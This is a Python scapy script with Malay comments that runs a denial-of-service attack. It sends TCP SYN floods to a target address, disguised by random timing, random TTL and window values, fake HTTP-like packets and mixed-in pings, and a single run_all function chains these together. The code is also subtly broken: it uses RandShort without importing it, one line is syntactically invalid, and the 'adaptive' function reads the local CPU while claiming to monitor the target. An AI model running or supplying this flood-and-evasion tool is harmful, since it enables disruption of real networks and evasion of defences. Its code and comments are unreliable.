import random
import time
from scapy.all import IP, TCP, ICMP, Raw, send
import psutil

# Menghantar paket dengan selang masa rawak
def send_packet_randomized(src, dst, proto, num_packets):
    for i in range(num_packets):
        delay = random.uniform(0.01, 0.1)  # Rawak antara 10ms hingga 100ms
        packet = IP(src=src, dst=dst)/proto()
        send(packet)
        time.sleep(delay)

# Meniru trafik HTTP yang sah
def send_mimic_traffic(src, dst, num_packets):
    for i in range(num_packets):
        # HTTP request-like packet
        packet = IP(src=src, dst=dst)/TCP(dport=80, sport=RandShort(), flags="S", seq=1000, window=8192)/
                 Raw(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
        send(packet)
        time.sleep(random.uniform(0.01, 0.1))  # Delay untuk meniru trafik sebenar

# Mengubah saiz TTL dan Window Size untuk evasion
def send_evasive_traffic(src, dst, num_packets):
    for i in range(num_packets):
        ttl_value = random.randint(64, 128)  # TTL rawak
        window_size = random.randint(8192, 65535)  # Saiz tingkap rawak

        packet = IP(src=src, dst=dst, ttl=ttl_value)/TCP(dport=80, sport=RandShort(), flags="S", seq=1000, window=window_size)
        send(packet)
        time.sleep(random.uniform(0.01, 0.1))  # Delay rawak untuk meniru trafik normal

# Menghantar serangan dengan trafik hibrid (Flood + Normal)
def send_hybrid_attack(src, dst, num_flood_packets, num_normal_ping):
    # Trafik Normal (Ping)
    for i in range(num_normal_ping):
        packet = IP(src=src, dst=dst)/ICMP()
        send(packet)
        time.sleep(random.uniform(0.1, 1))  # Selang lebih panjang

    # Trafik Flood (TCP)
    for i in range(num_flood_packets):
        packet = IP(src=src, dst=dst)/TCP(dport=80, sport=RandShort(), flags="S", seq=1000)
        send(packet)
        time.sleep(random.uniform(0.01, 0.1))  # Flood dengan delay rawak

# Penyesuaian serangan berdasarkan penggunaan CPU
def adaptive_attack(src, dst, base_flood_rate, max_flood_rate):
    # Pantau penggunaan CPU atau memori sasaran
    cpu_usage = psutil.cpu_percent(interval=1)

    # Sesuaikan kadar flood bergantung kepada penggunaan CPU
    if cpu_usage > 80:  # Jika CPU sangat tinggi
        flood_rate = min(base_flood_rate * 2, max_flood_rate)  # Naikkan kadar flood
    else:
        flood_rate = base_flood_rate

    # Laksanakan serangan dengan kadar yang disesuaikan
    for i in range(flood_rate):
        packet = IP(src=src, dst=dst)/TCP(dport=80, sport=RandShort(), flags="S", seq=1000)
        send(packet)
        time.sleep(random.uniform(0.01, 0.1))

# Fungsi utama untuk menjalankan serangan semua jenis secara serentak
def run_all():
    src = "10.0.0.1"  # IP sumber
    dst = "10.0.0.2"  # IP sasaran

    # Tentukan bilangan paket untuk setiap serangan
    num_flood_packets = 1000
    num_normal_ping = 100

    # Hantar trafik hibrid (Normal + Flood)
    send_hybrid_attack(src, dst, num_flood_packets, num_normal_ping)

    # Hantar trafik evasif
    send_evasive_traffic(src, dst, num_flood_packets)

    # Hantar trafik dengan selang masa rawak
    send_packet_randomized(src, dst, TCP, num_flood_packets)

    # Hantar trafik mimik HTTP
    send_mimic_traffic(src, dst, num_flood_packets)

    # Penyesuaian serangan berdasarkan penggunaan CPU
    adaptive_attack(src, dst, base_flood_rate=500, max_flood_rate=2000)

if __name__ == "__main__":
    run_all()
